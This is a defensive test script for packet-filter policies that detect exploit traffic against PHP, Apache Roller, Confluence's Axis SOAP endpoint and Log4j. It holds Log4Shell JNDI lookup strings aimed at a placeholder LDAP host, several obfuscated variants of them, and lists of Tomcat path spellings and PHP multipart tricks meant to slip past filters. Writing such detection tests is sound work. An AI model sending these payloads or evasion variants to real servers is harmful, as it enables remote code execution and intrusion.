/* Behaviour tests for the policies: every policy compiles, each one resets the
 * requests it names, and none of them touches ordinary traffic.
 *
 *   PFW_CORE=/path/to/pfw-core node test/run.mjs
 *
 * The policies run in pfw-core's reference interpreter, which executes the
 * same bytecode as the kernel over exactly the bytes it is given. It does not
 * model TCP reassembly: a "stream" here is fed one segment per run with the
 * connection's state carried between them, which is what the kernel's
 * per-connection match mask does. The sliding window itself is exercised by
 * test/kernel.mjs, on a Linux host.
 *
 * Where the cases come from, so they are not just the author's guesses:
 *
 *   fixtures/*.http   what curl, python-requests, wget and node's fetch really
 *                     sent to a listener, byte for byte. Every one must pass
 *                     every policy.
 *   fixtures/log4j-2.14.1-lookups.json
 *                     strings logged by a service on Log4j 2.14.1, and whether
 *                     the logger then opened a connection. Every one that
 *                     fired must be reset.
 *   TOMCAT            path spellings Tomcat 9.0 served the same resource for.
 *   PHP               multipart spellings PHP 8.3 under Apache 2.4 parsed.
 */
import { readFileSync, readdirSync, statSync } from "node:fs";

const core = process.env.PFW_CORE ?? new URL("../../pfw-core", import.meta.url).pathname;
let compile, toProgram, LIMITS;
try {
  ({ compile } = await import(`${core}/src/clang/index.js`));
  ({ toProgram } = await import(`${core}/src/program/index.js`));
  ({ LIMITS } = await import(`${core}/src/isa.js`));
} catch (e) {
  console.error(`cannot load pfw-core from ${core}: ${e.message}\nset PFW_CORE to a pfw-core checkout`);
  process.exit(2);
}

const root = new URL("../", import.meta.url);
const bytes = (s) => (typeof s === "string" ? Uint8Array.from(Buffer.from(s, "latin1")) : Uint8Array.from(s));
let failed = 0, passed = 0;
const ok = (cond, label, detail = "") => { if (cond) passed++; else { failed++; console.log(`FAIL ${label}${detail ? " — " + detail : ""}`); } };

/* ---- every policy in the repo compiles ---------------------------------- */
const policies = [];
const walk = (dir) => { for (const f of readdirSync(new URL(dir, root))) { if (f.startsWith(".") || f === "test") continue; const p = dir + f; if (statSync(new URL(p, root)).isDirectory()) walk(p + "/"); else if (f.endsWith(".pfc")) policies.push(p); } };
walk("");
const progs = new Map();
for (const f of policies.sort()) {
  let c;
  try { c = compile(readFileSync(new URL(f, root), "utf8")); } catch (e) { c = { ok: false, errors: [{ text: e.message }] }; }
  const fits = !c.regex || c.regex.nstates <= LIMITS.RE_STATES;
  ok(c.ok && fits, `${f} compiles`, c.ok ? `regex DFA has ${c.regex?.nstates} states` : JSON.stringify(c.errors));
  ok(!(c.warnings ?? []).length, `${f} compiles without warnings`, JSON.stringify(c.warnings));
  if (c.ok) progs.set(f, toProgram(c));
}

/* ---- harness ------------------------------------------------------------- */
const show = (r) => r.verdict + (r.ruleName && r.ruleName !== "-" ? `(${r.ruleName})` : "");
/* One connection: segments in order, state carried; the first verdict that is
 * not a pass ends it, as a reset does. */
function stream(f, label, segments, want, opts = {}) {
  let flow = {}, got = "pass";
  for (const seg of segments) {
    const r = progs.get(f).exec(bytes(seg), { flow, source: {}, bucket: {}, now: 0n, src: "192.0.2.10", sport: 51514, ...opts });
    flow = r.flow ?? flow;
    if (r.verdict !== "pass") { got = show(r); break; }
  }
  ok(got === want, `${f}: ${label}`, `got ${got}, want ${want}`);
}
const run = (f, label, data, want, opts) => stream(f, label, [data], want, opts);

const B = "----WebKitFormBoundary7MA4YWxkTrZu0gW";
const part = (disp, body = "x", type) => `--${B}\r\nContent-Disposition: form-data; ${disp}\r\n${type ? `Content-Type: ${type}\r\n` : ""}\r\n${body}\r\n`;
const req = (method, target, headers = "", body = "") => `${method} ${target} HTTP/1.1\r\nHost: example.test\r\nUser-Agent: Mozilla/5.0\r\n${headers}\r\n${body}`;
const get = (t, h) => req("GET", t, h);
const post = (t, h, b) => req("POST", t, h, b);
const multipart = (parts, extra) => { const body = parts.join("") + `--${B}--\r\n`; return post("/upload.php", `Content-Type: multipart/form-data; boundary=${B}\r\n${extra ?? `Content-Length: ${body.length}\r\n`}`, body); };

/* ---- php/php2shell ------------------------------------------------------- */
{
  const f = "php/php2shell.pfc", web = { dport: 80 };
  const N = "PHP_SESSION_UPLOAD_PROGRESS";
  const upload = [part(`name="title"`, "holiday"), part(`name="photo"; filename="a.jpg"`, "\xff\xd8\xff\xe0JFIF", "image/jpeg")];

  run(f, "ordinary upload", multipart(upload), "pass", web);
  run(f, "shallow array fields", multipart([part(`name="user[address][city]"`, "Oslo"), part(`name="tags[]"`, "a")]), "pass", web);
  run(f, "empty file control", multipart([part(`name="doc"; filename=""`, "", "application/octet-stream")]), "pass", web);
  run(f, "GET with array parameters", get("/index.php?a[b][c]=1&tags%5B%5D=x"), "pass", web);
  run(f, "urlencoded form", post("/login.php", "Content-Type: application/x-www-form-urlencoded\r\nContent-Length: 27\r\n", "user=jo&pass=hunter2&next=/"), "pass", web);
  run(f, "chunked JSON, no multipart on the connection", post("/api.php", "Content-Type: application/json\r\nTransfer-Encoding: chunked\r\n", `10\r\n{"hello":"world"}\r\n0\r\n\r\n`), "pass", web);
  run(f, "JSON arrays seven deep", post("/api.php", "Content-Type: application/json\r\n", "[1][2][3][4][5][6][7]"), "pass", web);

  /* PHP: each of these spellings arrived in $_POST under the real field name */
  for (const [how, disp] of [["quoted", `name="${N}"`], ["unquoted", `name=${N}`], ["single-quoted", `name='${N}'`], ["upper-case attribute", `NAME="${N}"`],
    ["space after =", `name= "${N}"`], ["decoy parameter first", `xname="q"; name="${N}"`], ["two names", `name="q"; name="${N}"`]])
    run(f, `upload-progress field, ${how}`, multipart([part(disp), ...upload]), "rst(php2shell_progress)", web);
  run(f, "upload-progress field, folded header", multipart([`--${B}\r\nContent-Disposition: form-data;\r\n name="${N}"\r\n\r\nx\r\n`]), "rst(php2shell_progress)", web);
  run(f, "upload-progress field in a later segment", part(`name="${N}"`), "rst(php2shell_progress)", web);

  /* PHP + Apache: each of these was served with HTTP_TRANSFER_ENCODING set and the body parsed */
  for (const te of ["Transfer-Encoding: chunked", "TRANSFER-ENCODING: CHUNKED", "Transfer-Encoding:\tchunked", "Transfer-Encoding:chunked", "Transfer-Encoding: gzip, chunked", "Transfer-Encoding:\r\n chunked"])
    run(f, `chunked multipart, ${JSON.stringify(te)}`, multipart(upload, te + "\r\n"), "rst(php2shell_chunked)", web);
  for (const ct of ["MULTIPART/FORM-DATA; boundary=B", "multipart/form-data;boundary=B", "multipart/form-data, boundary=B"])
    run(f, `chunked multipart, Content-Type ${ct}`, post("/", `Content-Type: ${ct}\r\nTransfer-Encoding: chunked\r\n`), "rst(php2shell_chunked)", web);
  stream(f, "chunked multipart, the two headers 6 kB and a segment apart",
    [`POST / HTTP/1.1\r\nHost: x\r\nContent-Type: multipart/form-data; boundary=B\r\nX-Pad: ${"a".repeat(3000)}`, `${"a".repeat(3000)}\r\nTransfer-Encoding: chunked\r\n\r\n`], "rst(php2shell_chunked)", web);

  /* PHP: depth 9 from each of these; groups with anything between them do not nest */
  for (const [how, name] of [["plain", "a" + "[k]".repeat(8)], ["empty groups", "a" + "[]".repeat(8)], ["newline inside a key", "a" + "[k\nk]".repeat(8)], ["bracket inside a key", "a" + "[[k]".repeat(8)]])
    run(f, `nested field name, ${how}`, multipart([part(`name="${name}"`)]), "rst(php2shell_nesting)", web);
  run(f, "nested name, urlencoded body", post("/", "Content-Type: application/x-www-form-urlencoded\r\n", "a" + "%5Bk%5D".repeat(8) + "=1"), "rst(php2shell_nesting)", web);
  run(f, "seven levels", multipart([part(`name="a${"[k]".repeat(7)}"`)]), "pass", web);
  run(f, "eight groups that do not nest", multipart([part(`name="a${"[k]x".repeat(8)}"`)]), "pass", web);

  run(f, "multipart=0 resets an ordinary upload", multipart(upload), "rst(php2shell_multipart)", { ...web, knobs: { multipart: 0 } });
  run(f, "multipart=0 leaves a GET alone", get("/"), "pass", { ...web, knobs: { multipart: 0 } });
  run(f, "chunked=1", multipart(upload, "Transfer-Encoding: chunked\r\n"), "pass", { ...web, knobs: { chunked: 1 } });
  run(f, "progress=1", multipart([part(`name="${N}"`)]), "pass", { ...web, knobs: { progress: 1 } });
  run(f, "nesting=1", multipart([part(`name="a${"[k]".repeat(9)}"`)]), "pass", { ...web, knobs: { nesting: 1 } });
  run(f, "another port", multipart(upload, "Transfer-Encoding: chunked\r\n"), "pass", { dport: 8080 });
  run(f, "port knob", multipart(upload, "Transfer-Encoding: chunked\r\n"), "rst(php2shell_chunked)", { dport: 8080, knobs: { port: 8080 } });
  run(f, "UDP", multipart(upload, "Transfer-Encoding: chunked\r\n"), "pass", { ...web, proto: 17 });
}

/* TOMCAT: every one of these returned the file at the plain path. */
const tomcatSpellings = (a, b) => [`/${a}/${b}`, `/${a};a=b/${b}`, `/${a}/${b};a=b`, `/${a}//${b}`, `//${a}/${b}`, `/${a}/./${b}`, `/${a}/x/../${b}`, `/x/../${a}/${b}`,
  `/${a}/%2e/${b}`, `/${a}/x/%2e%2e/${b}`, `/${a}/;/${b}`, `/;x/${a}/${b}`, `/ctx/${a}/${b}`, `http://example.test/${a}/${b}`,
  `/${a}/${b.slice(0, -1)}%${b.charCodeAt(b.length - 1).toString(16)}`, `/%${a.charCodeAt(0).toString(16)}${a.slice(1)}/${b}`,
  `/${a.replace("-", "%2d")}/${b}`, `/${a.replace("-", "%2D")}/${b}`, `/${a}/%${b.charCodeAt(0).toString(16).toUpperCase()}${b.slice(1)}?x=1`];

/* ---- java/roller-xmlrpc -------------------------------------------------- */
{
  const f = "java/roller-xmlrpc.pfc", web = { dport: 8080 };
  const call = `<?xml version="1.0"?><methodCall><methodName>blogger.getUsersBlogs</methodName></methodCall>`;
  for (const t of tomcatSpellings("roller-services", "xmlrpc")) run(f, `POST ${t}`, post(t, "Content-Type: text/xml\r\n", call), "rst(roller_xmlrpc)", web);
  run(f, "second request on a keep-alive connection", get("/roller/") + post("/roller-services/xmlrpc", "", call), "rst(roller_xmlrpc)", web);
  stream(f, "the two segments of the path 5 kB and a packet apart", [`POST /roller-services;${"a".repeat(2500)}`, `${"a".repeat(2500)}/xmlrpc HTTP/1.1\r\nHost: x\r\n\r\n`], "rst(roller_xmlrpc)", web);
  run(f, "front page", get("/roller/"), "pass", web);
  run(f, "a weblog entry", get("/roller/myblog/entry/hello-world"), "pass", web);
  run(f, "the Atom service", get("/roller-services/app"), "pass", web);
  run(f, "a comment", post("/roller/myblog/entry/hello", "Content-Type: application/x-www-form-urlencoded\r\n", "name=jo&content=nice+post"), "pass", web);
  run(f, "another port", post("/roller-services/xmlrpc", "", call), "pass", { dport: 80 });
  run(f, "port knob", post("/roller-services/xmlrpc", "", call), "rst(roller_xmlrpc)", { dport: 80, knobs: { port: 80 } });
}

/* ---- java/axis1-soap ----------------------------------------------------- */
{
  const f = "java/axis1-soap.pfc", web = { dport: 8090 };
  const env = `<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/"><soapenv:Body/></soapenv:Envelope>`;
  run(f, "the path seen exploited", post("/plugins/servlet/soap-axis1/confluenceservice-v2", `Content-Type: text/xml\r\nSOAPAction: ""\r\n`, env), "rst(axis1_soap)", web);
  for (const t of tomcatSpellings("soap-axis1", "confluenceservice-v2")) run(f, `POST /rpc${t.startsWith("http") ? " " + t : t}`, post(t.startsWith("http") ? t : "/rpc" + t, "Content-Type: text/xml\r\n", env), "rst(axis1_soap)", web);
  run(f, "soap-axis%31", get("/rpc/soap-axis%31/confluenceservice-v2?wsdl"), "rst(axis1_soap)", web);
  for (const t of tomcatSpellings("rpc", "xmlrpc")) run(f, `POST ${t}`, post(t, "Content-Type: text/xml\r\n", "<methodCall/>"), "rst(axis1_xmlrpc)", web);
  run(f, "xmlrpc=1 lets XML-RPC through", post("/rpc/xmlrpc", "Content-Type: text/xml\r\n", "<methodCall/>"), "pass", { ...web, knobs: { xmlrpc: 1 } });
  run(f, "xmlrpc=1 still resets SOAP", post("/rpc/soap-axis1/confluenceservice-v2", "", env), "rst(axis1_soap)", { ...web, knobs: { xmlrpc: 1 } });
  run(f, "dashboard", get("/dashboard.action"), "pass", web);
  run(f, "a page", get("/display/ENG/Runbook"), "pass", web);
  run(f, "REST API", get("/rest/api/content?spaceKey=ENG"), "pass", web);
  run(f, "another plugin servlet", get("/plugins/servlet/upm"), "pass", web);
  run(f, "a page whose title has rpc in it", get("/display/ENG/gRPC+and+JSON-RPC+notes"), "pass", web);
  run(f, "another port", post("/rpc/soap-axis1/confluenceservice-v2", "", env), "pass", { dport: 80 });
}

/* ---- java/log4shell ------------------------------------------------------ */
{
  const f = "java/log4shell.pfc", web = { dport: 8080 };
  const truth = JSON.parse(readFileSync(new URL("test/fixtures/log4j-2.14.1-lookups.json", root), "utf8")).cases;
  const header = (v) => get("/", `X-Api-Version: ${v}\r\n`);
  let fired = 0;
  for (const c of truth) {
    if (!c.fired) continue;
    fired++;
    const v = Buffer.from(c.value, "base64").toString("latin1");
    const r = progs.get(f).exec(bytes(header(v)), { flow: {}, source: {}, bucket: {}, now: 0n, ...web });
    ok(r.verdict === "rst", `${f}: Log4j resolved "${c.label}"`, `got ${show(r)}`);
    /* the jndi rule alone is not enough: with defaults allowed, what is left must still be caught or be a pure :- form */
  }
  ok(fired >= 15, `${f}: the Log4j fixture holds the lookups that fired`, `only ${fired}`);
  const J = "${jndi:ldap://203.0.113.9/a}";
  run(f, "in the User-Agent", req("GET", "/", "").replace("Mozilla/5.0", J), "rst(log4shell)", web);
  run(f, "in the path", get("/?q=" + J), "rst(log4shell)", web);
  run(f, "in a JSON body", post("/api", "Content-Type: application/json\r\n", `{"user":"${J}"}`), "rst(log4shell)", web);
  run(f, "percent-encoded", get("/?q=%24%7Bjndi%3Aldap%3A%2F%2F203.0.113.9%2Fa%7D"), "rst(log4shell)", web);
  run(f, "half percent-encoded", get("/?q=$%7bjndi:ldap://203.0.113.9/a}"), "rst(log4shell)", web);
  run(f, "JSON \\u escapes", post("/api", "Content-Type: application/json\r\n", `{"user":"\\u0024\\u007Bjndi:ldap://203.0.113.9/a}"}`), "rst(log4shell)", web);
  run(f, "no literal jndi: anywhere", header("${jndi${::-:}ldap://203.0.113.9/a}"), "rst(log4shell)", web);
  run(f, "jndi built from lookups", header("${${lower:j}${upper:n}${lower:d}i:ldap://203.0.113.9/a}"), "rst(log4shell_lookup)", web);
  run(f, "jndi built from defaults", header("${${x:-j}${y:-n}di:ldap://203.0.113.9/a}"), "rst(log4shell_default)", web);
  run(f, "a default behind an encoded colon", get("/?q=%24%7B%24%7Bx%3A-j%7Dndi"), "rst(log4shell_default)", web);
  run(f, "lookup pieces still reset with defaults=1", header("${${lower:j}ndi:ldap://203.0.113.9/a}"), "rst(log4shell_lookup)", { ...web, knobs: { defaults: 1 } });
  run(f, "shell default, the documented cost", post("/job", "Content-Type: text/plain\r\n", "cd ${HOME:-/root}"), "rst(log4shell_default)", web);
  run(f, "shell default with defaults=1", post("/job", "Content-Type: text/plain\r\n", "cd ${HOME:-/root}"), "pass", { ...web, knobs: { defaults: 1 } });
  run(f, "template placeholders", post("/tpl", "Content-Type: text/plain\r\n", "Hello ${user.name}, total ${amount} at ${time}"), "pass", web);
  run(f, "JS template literal with a ternary", post("/src", "Content-Type: text/plain\r\n", "`${ok ? 'yes' : 'no'}`"), "pass", web);
  run(f, "a dollar amount and braces", post("/api", "Content-Type: application/json\r\n", `{"price":"$5","note":"{jndi} is a word"}`), "pass", web);
  run(f, "another port", header(J), "pass", { dport: 80 });
}

/* ---- cross-check: real client traffic through every policy -------------- */
{
  const fx = readdirSync(new URL("test/fixtures/", root)).filter((n) => n.endsWith(".http")).sort();
  ok(fx.length >= 10, "captured client requests are present", `${fx.length} found`);
  const PORT = { "http/crawlers.pfc": 80, "php/php2shell.pfc": 80, "java/roller-xmlrpc.pfc": 8080, "java/axis1-soap.pfc": 8090, "java/log4shell.pfc": 8080 };
  for (const f of progs.keys()) {
    for (const n of fx) {
      const data = readFileSync(new URL(`test/fixtures/${n}`, root));
      /* whole, and as 1460-byte segments on one connection */
      const segs = []; for (let i = 0; i < data.length; i += 1460) segs.push(data.subarray(i, i + 1460));
      stream(f, `captured ${n}`, [data], "pass", { dport: PORT[f] ?? 80 });
      stream(f, `captured ${n}, segmented`, segs, "pass", { dport: PORT[f] ?? 80 });
    }
  }
}

console.log(failed ? `${failed} FAILED, ${passed} passed` : `all ${passed} passed`);
process.exit(failed ? 1 : 0);
